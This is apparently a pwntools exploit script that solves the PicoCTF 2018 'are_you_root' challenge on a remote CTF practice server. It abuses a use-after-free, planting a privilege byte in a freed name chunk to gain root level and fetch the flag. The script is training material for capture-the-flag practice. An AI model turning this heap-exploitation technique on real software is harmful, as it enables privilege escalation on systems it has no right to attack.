from pwn import *


# p = process("./PicoCTF_2018_are_you_root")
p = remote("node4.buuoj.cn", 25603)


def login(name):
    p.sendlineafter("> ", b"login "+name)

def reset():
    p.sendlineafter("> ", "reset")

def getflag():
    p.sendlineafter("> ", "get-flag")


# uaf (the chunk don't be set zero)

name = cyclic(0x8)+p8(5)
login(name)
reset()

# login again, use chunk "name"
login(b"aaaa")
getflag()

p.interactive()


